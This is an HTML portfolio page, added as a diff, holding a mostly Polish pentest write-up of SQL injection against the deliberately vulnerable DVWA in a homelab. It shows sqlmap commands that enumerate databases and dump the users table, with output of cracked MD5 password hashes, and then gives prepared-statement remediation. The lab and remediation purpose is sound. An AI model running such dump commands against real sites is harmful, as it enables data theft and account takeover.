@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pentest Report: DVWA SQLi | Maksymilian Frankowski</title>
+  <meta name="description"
+    content="Red Team Write-up: Automated SQL Injection vulnerability assessment performed on DVWA in an isolated homelab environment." />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon" type="image/svg+xml"
+    href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' fill='none'%3E%3Crect x='1' y='1' width='30' height='30' rx='6' stroke='%2322d3ee' stroke-width='1.5'/%3E%3Cpath d='M8 11 L12 16 L8 21' stroke='%2322d3ee' stroke-width='1.75' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cline x1='14' y1='21' x2='23' y2='21' stroke='%2322d3ee' stroke-width='1.75' stroke-linecap='round'/%3E%3C/svg%3E" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            heading: ['"Space Grotesk"', 'system-ui', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'ui-monospace', 'monospace'],
+          },
+          animation: {
+            'fade-in':    'fadeIn 0.8s ease-out forwards',
+            'fade-in-up': 'fadeInUp 0.9s ease-out forwards',
+            'blink':      'blink 1s step-end infinite',
+          },
+          keyframes: {
+            fadeIn:    { '0%': { opacity: '0' }, '100%': { opacity: '1' } },
+            fadeInUp:  { '0%': { opacity: '0', transform: 'translateY(20px)' }, '100%': { opacity: '1', transform: 'translateY(0)' } },
+            blink:     { '0%, 100%': { opacity: '1' }, '50%': { opacity: '0' } },
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'JetBrains Mono', ui-monospace, monospace;
+    }
+
+    h1, h2, h3, h4, .font-heading {
+      font-family: 'Space Grotesk', system-ui, sans-serif;
+    }
+
+    .grid-bg {
+      background-image:
+        linear-gradient(rgba(34, 211, 238, 0.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(34, 211, 238, 0.025) 1px, transparent 1px);
+      background-size: 48px 48px;
+    }
+
+    .scanline::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(0deg,
+          transparent, transparent 2px,
+          rgba(0, 0, 0, 0.025) 2px, rgba(0, 0, 0, 0.025) 4px);
+      pointer-events: none;
+      z-index: 50;
+    }
+
+    .logo-glow  { box-shadow: 0 0 20px rgba(34, 211, 238, 0.25); }
+    .glow-cyan  { text-shadow: 0 0 20px rgba(34, 211, 238, 0.5); }
+
+    ::selection { background: rgba(34, 211, 238, 0.3); color: #f8fafc; }
+
+    /* ── report images ── */
+    .report-img {
+      display: block;
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+      border: 1px solid rgba(34, 211, 238, 0.15);
+      box-shadow:
+        0 4px 24px rgba(0, 0, 0, 0.55),
+        0 0 0 1px rgba(34, 211, 238, 0.08);
+      transition: box-shadow 0.3s ease, border-color 0.3s ease;
+    }
+
+    .report-img:hover {
+      border-color: rgba(34, 211, 238, 0.35);
+      box-shadow:
+        0 8px 32px rgba(0, 0, 0, 0.65),
+        0 0 0 1px rgba(34, 211, 238, 0.2),
+        0 0 24px rgba(34, 211, 238, 0.08);
+    }
+
+    /* ── fade sections ── */
+    .fade-section {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.7s ease-out, transform 0.7s ease-out;
+    }
+    .fade-section.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* ── phase accent lines ── */
+    .phase-line-cyan   { border-left: 3px solid rgba(34, 211, 238, 0.6); }
+    .phase-line-red    { border-left: 3px solid rgba(248, 113, 113, 0.6); }
+    .phase-line-emerald{ border-left: 3px solid rgba(52, 211, 153, 0.6); }
+
+    /* ── command block cursor blink ── */
+    .cmd-cursor {
+      display: inline-block;
+      width: 8px;
+      height: 1em;
+      background: #22d3ee;
+      vertical-align: text-bottom;
+      animation: blink 1s step-end infinite;
+    }
+  </style>
+</head>
+
+<body class="bg-slate-950 text-slate-300 antialiased scanline grid-bg min-h-screen">
+
+  <!-- Ambient glow -->
+  <div class="pointer-events-none fixed inset-0 overflow-hidden" aria-hidden="true">
+    <div class="absolute -top-40 -right-40 h-96 w-96 rounded-full bg-cyan-500/8 blur-3xl"></div>
+    <div class="absolute top-1/3 -left-40 h-80 w-80 rounded-full bg-cyan-500/5 blur-3xl"></div>
+    <div class="absolute bottom-0 right-1/4 h-64 w-64 rounded-full bg-red-500/5 blur-3xl"></div>
+  </div>
+
+  <!-- NAV -->
+  <header class="fixed top-0 left-0 right-0 z-40 border-b border-cyan-400/10 bg-slate-950/80 backdrop-blur-md animate-fade-in">
+    <nav class="mx-auto flex max-w-5xl items-center justify-between px-6 py-4">
+      <a href="index.html" class="group flex items-center gap-3" aria-label="Back to portfolio">
+        <span class="logo-glow flex h-9 w-9 shrink-0 items-center justify-center rounded-md border border-cyan-400/40 bg-cyan-400/10 transition-all group-hover:border-cyan-400/70 group-hover:bg-cyan-400/15">
+          <svg class="h-5 w-5 text-cyan-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" aria-hidden="true">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+          </svg>
+        </span>
+        <span class="font-heading text-sm font-semibold tracking-widest text-slate-200 transition-colors group-hover:text-cyan-400">
+          ZWIDEK<span class="text-cyan-400/80">/</span><span class="text-slate-500">SYS</span>
+        </span>
+      </a>
+
+      <div class="flex items-center gap-4">
+        <span class="hidden font-mono text-[10px] uppercase tracking-widest text-slate-600 sm:block">
+          Red Team Write-up
+        </span>
+        <a href="index.html"
+          class="inline-flex items-center gap-2 rounded border border-cyan-400/30 px-4 py-2 font-mono text-xs text-cyan-400 transition-all hover:border-cyan-400/60 hover:bg-cyan-400/10">
+          ← Portfolio
+        </a>
+      </div>
+    </nav>
+  </header>
+
+  <main class="relative z-10 mx-auto max-w-5xl px-6 pb-24 pt-28">
+
+    <!-- ═══════════════════════════════════════════════
+         HEADER & META
+    ═══════════════════════════════════════════════ -->
+    <section class="mb-12 animate-fade-in-up">
+      <!-- Classification banner -->
+      <div class="mb-8 flex items-center gap-3 rounded border border-red-500/30 bg-red-500/5 px-4 py-2.5">
+        <svg class="h-4 w-4 shrink-0 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
+        </svg>
+        <span class="font-mono text-xs text-red-400">
+          CLASSIFICATION: INTERNAL — HOMELAB ONLY · For educational and portfolio purposes exclusively
+        </span>
+      </div>
+
+      <!-- Report label -->
+      <p class="font-mono text-xs text-cyan-400">PENTEST REPORT // RED TEAM WRITE-UP</p>
+
+      <!-- Title -->
+      <h1 class="font-heading mt-3 text-3xl font-bold leading-tight text-slate-100 sm:text-4xl md:text-5xl glow-cyan">
+        Vulnerability Assessment:<br class="hidden sm:block" /> Automated SQL Injection
+      </h1>
+
+      <!-- Badges -->
+      <div class="mt-6 flex flex-wrap gap-2">
+        <span class="inline-flex items-center gap-1.5 rounded border border-slate-600/60 bg-slate-800/60 px-3 py-1 font-mono text-xs text-slate-300">
+          <svg class="h-3 w-3 text-slate-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14" /></svg>
+          Target: DVWA
+        </span>
+        <span class="inline-flex items-center gap-1.5 rounded border border-red-500/40 bg-red-500/10 px-3 py-1 font-mono text-xs text-red-400">
+          <svg class="h-3 w-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
+          Vector: Error-based / Time-based SQLi
+        </span>
+        <span class="inline-flex items-center gap-1.5 rounded border border-cyan-400/30 bg-cyan-400/10 px-3 py-1 font-mono text-xs text-cyan-400">
+          <svg class="h-3 w-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2" /></svg>
+          Environment: Homelab
+        </span>
+        <span class="inline-flex items-center gap-1.5 rounded border border-slate-700/60 bg-slate-900/60 px-3 py-1 font-mono text-xs text-slate-400">
+          Tool: sqlmap 1.8.x
+        </span>
+      </div>
+
+      <!-- Report metadata block -->
+      <div class="mt-8 overflow-hidden rounded-lg border border-cyan-400/15 bg-slate-900/60 backdrop-blur-sm">
+        <div class="flex items-center gap-2 border-b border-cyan-400/10 bg-slate-900/80 px-4 py-2.5">
+          <span class="h-2 w-2 rounded-full bg-red-500/80"></span>
+          <span class="h-2 w-2 rounded-full bg-yellow-500/80"></span>
+          <span class="h-2 w-2 rounded-full bg-emerald-500/80"></span>
+          <span class="ml-2 font-mono text-[10px] text-slate-500">report-metadata.json</span>
+        </div>
+        <div class="grid gap-y-1.5 px-5 py-5 font-mono text-xs sm:grid-cols-2 sm:gap-x-12">
+          <p><span class="w-28 inline-block text-slate-500">author</span><span class="text-slate-200">Maksymilian Frankowski</span></p>
+          <p><span class="w-28 inline-block text-slate-500">date</span><span class="text-slate-300">2026-05-26</span></p>
+          <p><span class="w-28 inline-block text-slate-500">classification</span><span class="text-red-400">Internal — Homelab Only</span></p>
+          <p><span class="w-28 inline-block text-slate-500">tool</span><span class="text-slate-300">sqlmap 1.8.x</span></p>
+          <p><span class="w-28 inline-block text-slate-500">target_app</span><span class="text-slate-300">Damn Vulnerable Web App (DVWA)</span></p>
+          <p><span class="w-28 inline-block text-slate-500">scope</span><span class="text-emerald-400">Isolated local network · No live systems</span></p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Divider -->
+    <hr class="mb-12 border-cyan-400/10" />
+
+    <!-- ═══════════════════════════════════════════════
+         EXECUTIVE SUMMARY
+    ═══════════════════════════════════════════════ -->
+    <section class="fade-section mb-16">
+      <p class="font-mono text-xs text-cyan-400">00 // EXECUTIVE SUMMARY</p>
+      <h2 class="font-heading mt-2 text-2xl font-bold text-slate-100 sm:text-3xl">Overview</h2>
+
+      <div class="phase-line-cyan mt-6 rounded-r-lg bg-white/[0.03] py-5 pl-6 pr-5">
+        <p class="font-mono text-sm leading-relaxed text-slate-400 sm:text-base">
+          Poniższy raport przedstawia zautomatyzowaną ekstrakcję danych ze środowiska podatnego na atak
+          <span class="text-slate-200">SQL Injection</span>. Test przeprowadzono w całkowicie izolowanym środowisku
+          lokalnym (Homelab), na celowo podatnej aplikacji
+          (<span class="text-cyan-400">Damn Vulnerable Web App</span>), w celu demonstracji łańcucha ataku
+          (<span class="text-slate-200">Kill Chain</span>) — od rozpoznania, aż po łamanie zabezpieczeń kryptograficznych.
+        </p>
+      </div>
+
+      <!-- Kill chain visual -->
+      <div class="mt-8 flex flex-wrap items-center gap-0">
+        <div class="flex items-center gap-2 rounded-l border border-r-0 border-slate-700/60 bg-slate-900/60 px-4 py-2.5 font-mono text-xs text-slate-400">
+          <span class="h-1.5 w-1.5 rounded-full bg-cyan-400"></span>Reconnaissance
+        </div>
+        <div class="font-mono text-[10px] text-slate-600 px-1">→</div>
+        <div class="flex items-center gap-2 border border-r-0 border-slate-700/60 bg-slate-900/60 px-4 py-2.5 font-mono text-xs text-slate-400">
+          <span class="h-1.5 w-1.5 rounded-full bg-yellow-400"></span>Exploitation
+        </div>
+        <div class="font-mono text-[10px] text-slate-600 px-1">→</div>
+        <div class="flex items-center gap-2 border border-r-0 border-slate-700/60 bg-slate-900/60 px-4 py-2.5 font-mono text-xs text-slate-400">
+          <span class="h-1.5 w-1.5 rounded-full bg-orange-400"></span>Data Exfiltration
+        </div>
+        <div class="font-mono text-[10px] text-slate-600 px-1">→</div>
+        <div class="flex items-center gap-2 rounded-r border border-slate-700/60 bg-slate-900/60 px-4 py-2.5 font-mono text-xs text-red-400">
+          <span class="h-1.5 w-1.5 rounded-full bg-red-400"></span>Credential Cracking
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════
+         PHASE 1: DISCOVERY
+    ═══════════════════════════════════════════════ -->
+    <section class="fade-section mb-16">
+      <div class="mb-6 flex items-center gap-3">
+        <span class="flex h-8 w-8 items-center justify-center rounded border border-cyan-400/30 bg-cyan-400/10 font-mono text-xs font-semibold text-cyan-400">01</span>
+        <div>
+          <p class="font-mono text-xs text-cyan-400">PHASE-01 // DISCOVERY</p>
+          <h2 class="font-heading text-2xl font-bold text-slate-100 sm:text-3xl">Reconnaissance</h2>
+        </div>
+      </div>
+
+      <div class="phase-line-cyan mb-6 rounded-r-lg bg-white/[0.03] py-5 pl-6 pr-5">
+        <p class="font-mono text-sm leading-relaxed text-slate-400">
+          Wykorzystano narzędzie <span class="text-cyan-400">sqlmap</span> do enumeracji dostępnych baz danych.
+          Potwierdzono podatność parametru <code class="rounded bg-slate-800 px-1.5 py-0.5 text-xs text-slate-200">ID</code>
+          na atak typu <span class="text-slate-200">boolean-based blind</span> i wyliczono schematy, co ujawniło
+          główny cel: bazę <code class="rounded bg-slate-800 px-1.5 py-0.5 text-xs text-emerald-400">dvwa</code>.
+        </p>
+      </div>
+
+      <!-- Command block -->
+      <div class="mb-6 overflow-hidden rounded-lg border border-cyan-400/15 bg-slate-950/90">
+        <div class="flex items-center justify-between border-b border-cyan-400/10 bg-slate-900/80 px-4 py-2">
+          <div class="flex items-center gap-2">
+            <span class="h-2 w-2 rounded-full bg-red-500/80"></span>
+            <span class="h-2 w-2 rounded-full bg-yellow-500/80"></span>
+            <span class="h-2 w-2 rounded-full bg-emerald-500/80"></span>
+            <span class="ml-2 font-mono text-[10px] text-slate-500">bash · Phase 1 Command</span>
+          </div>
+          <span class="font-mono text-[10px] text-slate-600">sqlmap --dbs</span>
+        </div>
+        <pre class="overflow-x-auto px-5 py-5 font-mono text-xs leading-relaxed sm:text-sm"><code><span class="text-slate-500"># Enumerate available databases</span>
+<span class="text-emerald-400">$</span> sqlmap <span class="text-cyan-400">-u</span> <span class="text-yellow-300">"http://dvwa.local/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> \
+    <span class="text-cyan-400">--cookie</span>=<span class="text-yellow-300">"PHPSESSID=a1b2c3d4; security=low"</span> \
+    <span class="text-cyan-400">--dbs</span> <span class="text-cyan-400">--batch</span> <span class="text-cyan-400">--level</span>=<span class="text-slate-200">3</span>
+
+<span class="text-slate-600">---</span>
+<span class="text-slate-500">[*] starting @ 21:04:12</span>
+<span class="text-slate-400">[INFO] testing connection to the target URL</span>
+<span class="text-yellow-400">[INFO] parameter 'id' appears to be 'boolean-based blind' injectable</span>
+<span class="text-red-400">[INFO] parameter 'id' appears to be 'error-based' injectable</span>
+
+<span class="text-emerald-400">available databases [2]:</span>
+<span class="text-slate-300">[*] dvwa</span>
+<span class="text-slate-300">[*] information_schema</span></code></pre>
+      </div>
+
+      <!-- Screenshot -->
+      <figure class="space-y-2">
+        <img
+          src="https://cdn.zwidek.pl/cybersec-reports/dvwa-sqli/01-discovery.png"
+          alt="SQLi Discovery Phase — sqlmap database enumeration output"
+          class="report-img" />
+        <figcaption class="font-mono text-[10px] text-slate-600">
+          Fig. 1 — sqlmap confirming SQL injection vectors and enumerating database schemas
+        </figcaption>
+      </figure>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════
+         PHASE 2: DATA EXFILTRATION & CRACKING
+    ═══════════════════════════════════════════════ -->
+    <section class="fade-section mb-16">
+      <div class="mb-6 flex items-center gap-3">
+        <span class="flex h-8 w-8 items-center justify-center rounded border border-red-500/30 bg-red-500/10 font-mono text-xs font-semibold text-red-400">02</span>
+        <div>
+          <p class="font-mono text-xs text-red-400">PHASE-02 // EXPLOITATION</p>
+          <h2 class="font-heading text-2xl font-bold text-slate-100 sm:text-3xl">Data Exfiltration &amp; Cracking</h2>
+        </div>
+      </div>
+
+      <div class="phase-line-red mb-6 rounded-r-lg bg-white/[0.03] py-5 pl-6 pr-5">
+        <p class="font-mono text-sm leading-relaxed text-slate-400">
+          Skoncentrowano ładunek bezpośrednio na tabeli
+          <code class="rounded bg-slate-800 px-1.5 py-0.5 text-xs text-slate-200">users</code>
+          w zidentyfikowanej bazie. Dokonano pełnego zrzutu danych (<span class="text-slate-200">dump</span>)
+          oraz w locie złamano hashe <span class="text-red-400">MD5</span> metodą słownikową, uzyskując dostęp
+          do kont administracyjnych.
+        </p>
+      </div>
+
+      <!-- Command block -->
+      <div class="mb-6 overflow-hidden rounded-lg border border-red-500/15 bg-slate-950/90">
+        <div class="flex items-center justify-between border-b border-red-500/10 bg-slate-900/80 px-4 py-2">
+          <div class="flex items-center gap-2">
+            <span class="h-2 w-2 rounded-full bg-red-500/80"></span>
+            <span class="h-2 w-2 rounded-full bg-yellow-500/80"></span>
+            <span class="h-2 w-2 rounded-full bg-emerald-500/80"></span>
+            <span class="ml-2 font-mono text-[10px] text-slate-500">bash · Phase 2 Command</span>
+          </div>
+          <span class="font-mono text-[10px] text-red-500/70">sqlmap --dump</span>
+        </div>
+        <pre class="overflow-x-auto px-5 py-5 font-mono text-xs leading-relaxed sm:text-sm"><code><span class="text-slate-500"># Target specific table and dump with hash cracking</span>
+<span class="text-emerald-400">$</span> sqlmap <span class="text-cyan-400">-u</span> <span class="text-yellow-300">"http://dvwa.local/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> \
+    <span class="text-cyan-400">--cookie</span>=<span class="text-yellow-300">"PHPSESSID=a1b2c3d4; security=low"</span> \
+    <span class="text-cyan-400">-D</span> dvwa <span class="text-cyan-400">-T</span> users \
+    <span class="text-cyan-400">--dump</span> <span class="text-cyan-400">--batch</span>
+
+<span class="text-slate-600">---</span>
+<span class="text-slate-400">[INFO] fetching columns for table 'users' in database 'dvwa'</span>
+<span class="text-yellow-400">[INFO] recognized possible password hashes in column 'password'</span>
+<span class="text-red-400">[INFO] cracking hashes with dictionary attack (MD5)</span>
+<span class="text-emerald-400">[INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'</span>
+<span class="text-emerald-400">[INFO] cracked password 'abc123'   for hash '0d107d09f5bbe40cade3de5c71e9e9b7'</span></code></pre>
+      </div>
+
+      <!-- Screenshots -->
+      <div class="space-y-6">
+        <figure class="space-y-2">
+          <img
+            src="https://cdn.zwidek.pl/cybersec-reports/dvwa-sqli/02-dump-command.png"
+            alt="SQLi Dump Command — targeting dvwa.users table"
+            class="report-img" />
+          <figcaption class="font-mono text-[10px] text-slate-600">
+            Fig. 2 — sqlmap payload targeting <code class="text-slate-500">dvwa.users</code> table, triggering full data dump
+          </figcaption>
+        </figure>
+
+        <figure class="space-y-2">
+          <img
+            src="https://cdn.zwidek.pl/cybersec-reports/dvwa-sqli/03-cracked-hashes.png"
+            alt="Cracked MD5 Hashes — admin credentials recovered"
+            class="report-img" />
+          <figcaption class="font-mono text-[10px] text-slate-600">
+            Fig. 3 — MD5 hashes cracked on-the-fly via dictionary attack; admin credentials fully exposed
+          </figcaption>
+        </figure>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════
+         REMEDIATION
+    ═══════════════════════════════════════════════ -->
+    <section class="fade-section mb-16">
+      <div class="mb-6 flex items-center gap-3">
+        <span class="flex h-8 w-8 items-center justify-center rounded border border-emerald-400/30 bg-emerald-400/10 font-mono text-xs font-semibold text-emerald-400">FIX</span>
+        <div>
+          <p class="font-mono text-xs text-emerald-400">REMEDIATION // REKOMENDACJE NAPRAWCZE</p>
+          <h2 class="font-heading text-2xl font-bold text-slate-100 sm:text-3xl">How to Fix It</h2>
+        </div>
+      </div>
+
+      <!-- Warning callout -->
+      <div class="phase-line-emerald mb-8 rounded-r-lg border border-emerald-400/15 bg-emerald-400/5 py-5 pl-6 pr-5">
+        <div class="mb-3 flex items-center gap-2">
+          <svg class="h-4 w-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+          </svg>
+          <span class="font-mono text-xs font-semibold text-emerald-400">REMEDIATION NOTE</span>
+        </div>
+        <p class="font-mono text-sm leading-relaxed text-slate-400">
+          Aby zabezpieczyć aplikację przed tego typu wektorem ataku, rekomenduje się wdrożenie
+          <span class="text-slate-200">parametryzacji zapytań (Prepared Statements)</span> po stronie backendu
+          (np. przy użyciu biblioteki <span class="text-emerald-400">PDO</span> w PHP) oraz rygorystyczną
+          <span class="text-slate-200">walidację i sanityzację</span> danych wejściowych
+          pochodzących od użytkownika.
+        </p>
+      </div>
+
+      <!-- Remediation checklist -->
+      <div class="mb-8 overflow-hidden rounded-lg border border-slate-700/40 bg-slate-900/50">
+        <div class="border-b border-slate-700/40 bg-slate-900/80 px-5 py-3 font-mono text-xs text-slate-500">
+          remediation-checklist.md
+        </div>
+        <ul class="divide-y divide-slate-800/60 px-5 py-2 font-mono text-sm">
+          <li class="flex items-start gap-3 py-3">
+            <span class="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-emerald-400/40 bg-emerald-400/10 font-mono text-[10px] text-emerald-400">✓</span>
+            <div>
+              <span class="text-slate-200">Prepared Statements / Parameterized Queries</span>
+              <p class="mt-0.5 text-xs text-slate-500">Zastąp dynamiczne zapytania SQL zapytaniami parametryzowanymi. PDO (PHP), psycopg2 (Python), PreparedStatement (Java).</p>
+            </div>
+          </li>
+          <li class="flex items-start gap-3 py-3">
+            <span class="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-emerald-400/40 bg-emerald-400/10 font-mono text-[10px] text-emerald-400">✓</span>
+            <div>
+              <span class="text-slate-200">Input Validation &amp; Sanitization</span>
+              <p class="mt-0.5 text-xs text-slate-500">Waliduj typy, długości i dozwolone znaki każdego parametru wejściowego. Nie ufaj danym od użytkownika.</p>
+            </div>
+          </li>
+          <li class="flex items-start gap-3 py-3">
+            <span class="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-emerald-400/40 bg-emerald-400/10 font-mono text-[10px] text-emerald-400">✓</span>
+            <div>
+              <span class="text-slate-200">Least Privilege Database Account</span>
+              <p class="mt-0.5 text-xs text-slate-500">Konto bazy danych używane przez aplikację powinno mieć wyłącznie uprawnienia <code class="text-slate-300">SELECT/INSERT/UPDATE</code> na wymaganych tabelach.</p>
+            </div>
+          </li>
+          <li class="flex items-start gap-3 py-3">
+            <span class="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-emerald-400/40 bg-emerald-400/10 font-mono text-[10px] text-emerald-400">✓</span>
+            <div>
+              <span class="text-slate-200">Strong Password Hashing</span>
+              <p class="mt-0.5 text-xs text-slate-500">Zamień MD5 na <code class="text-slate-300">bcrypt</code> / <code class="text-slate-300">Argon2id</code>. MD5 jest kryptograficznie złamany i nie nadaje się do przechowywania haseł.</p>
+            </div>
+          </li>
+          <li class="flex items-start gap-3 py-3">
+            <span class="mt-0.5 flex h-5 w-5 shrink-0 items-center justify-center rounded-full border border-emerald-400/40 bg-emerald-400/10 font-mono text-[10px] text-emerald-400">✓</span>
+            <div>
+              <span class="text-slate-200">Web Application Firewall (WAF)</span>
+              <p class="mt-0.5 text-xs text-slate-500">Wdrożenie WAF (np. ModSecurity, Cloudflare WAF) jako dodatkowej warstwy detekcji i blokowania ataków SQLi.</p>
+            </div>
+          </li>
+        </ul>
+      </div>
+
+      <!-- Secure code example -->
+      <div class="overflow-hidden rounded-lg border border-emerald-400/15 bg-slate-950/90">
+        <div class="flex items-center justify-between border-b border-emerald-400/10 bg-slate-900/80 px-4 py-2">
+          <div class="flex items-center gap-2">
+            <span class="h-2 w-2 rounded-full bg-red-500/80"></span>
+            <span class="h-2 w-2 rounded-full bg-yellow-500/80"></span>
+            <span class="h-2 w-2 rounded-full bg-emerald-500/80"></span>
+            <span class="ml-2 font-mono text-[10px] text-slate-500">secure-query.php · Remediated code</span>
+          </div>
+          <span class="font-mono text-[10px] text-emerald-500/70">SECURE</span>
+        </div>
+        <pre class="overflow-x-auto px-5 py-5 font-mono text-xs leading-relaxed sm:text-sm"><code><span class="text-slate-500">// ❌ VULNERABLE — dynamic string concatenation</span>
+<span class="text-red-400">$query = "SELECT * FROM users WHERE id = " . $_GET['id'];</span>
+
+<span class="text-slate-600">// ─────────────────────────────────────────────────</span>
+
+<span class="text-slate-500">// ✅ SECURE — PDO Prepared Statement</span>
+<span class="text-cyan-400">$stmt</span> = <span class="text-slate-200">$pdo</span>-><span class="text-emerald-400">prepare</span>(<span class="text-yellow-300">"SELECT * FROM users WHERE id = :id"</span>);
+<span class="text-cyan-400">$stmt</span>-><span class="text-emerald-400">execute</span>([<span class="text-yellow-300">':id'</span> => <span class="text-slate-200">$_GET</span>[<span class="text-yellow-300">'id'</span>]]);
+<span class="text-cyan-400">$result</span> = <span class="text-cyan-400">$stmt</span>-><span class="text-emerald-400">fetchAll</span>();</code></pre>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════
+         CONCLUSION
+    ═══════════════════════════════════════════════ -->
+    <section class="fade-section">
+      <div class="overflow-hidden rounded-lg border border-cyan-400/15 bg-slate-900/50 backdrop-blur-sm">
+        <div class="flex items-center gap-2 border-b border-cyan-400/10 bg-slate-900/80 px-5 py-3">
+          <span class="h-2.5 w-2.5 rounded-full bg-red-500/80"></span>
+          <span class="h-2.5 w-2.5 rounded-full bg-yellow-500/80"></span>
+          <span class="h-2.5 w-2.5 rounded-full bg-emerald-500/80"></span>
+          <span class="ml-3 font-mono text-xs text-slate-500">root@zwidek-core-01 ~ report.conclusion</span>
+        </div>
+        <div class="px-5 py-6 font-mono text-xs leading-relaxed sm:text-sm">
+          <p>
+            <span class="text-cyan-400">const</span>
+            <span class="text-slate-200"> conclusion </span>
+            <span class="text-slate-500">= </span>
+            <span class="text-yellow-300">"Cały łańcuch ataku (Kill Chain) — od detekcji podatności po odzyskanie danych uwierzytelniających — wykonano w pełni zautomatyzowanie przy użyciu sqlmap w czasie poniżej 60 sekund."</span><span class="text-slate-500">;</span>
+          </p>
+          <p class="mt-3 text-slate-500">
+            <span class="text-cyan-400/60">//</span> Demonstracja podkreśla krytyczne znaczenie Prepared Statements
+            i silnego hashowania haseł w każdej aplikacji webowej.
+          </p>
+          <p class="mt-4">
+            <span class="text-emerald-400">$</span>
+            <span class="text-slate-400"> echo <span class="text-yellow-300">"Report generated by Maksymilian Frankowski · zwidek.pl"</span></span>
+            <span class="cmd-cursor ml-1"></span>
+          </p>
+        </div>
+      </div>
+
+      <!-- Back link -->
+      <div class="mt-10 flex items-center justify-between">
+        <a href="index.html"
+          class="inline-flex items-center gap-2 font-mono text-sm text-cyan-400 transition-colors hover:text-cyan-300">
+          ← Back to portfolio
+        </a>
+        <p class="font-mono text-[10px] text-slate-700">© 2026 · Maksymilian Frankowski · All systems nominal</p>
+      </div>
+    </section>
+
+  </main>
+
+  <script>
+    (function () {
+      const sections = document.querySelectorAll('.fade-section');
+      const observer = new IntersectionObserver(
+        function (entries) {
+          entries.forEach(function (entry) {
+            if (entry.isIntersecting) entry.target.classList.add('visible');
+          });
+        },
+        { threshold: 0.08, rootMargin: '0px 0px -40px 0px' }
+      );
+      sections.forEach(function (s) { observer.observe(s); });
+    })();
+  </script>
+</body>
+
+</html>
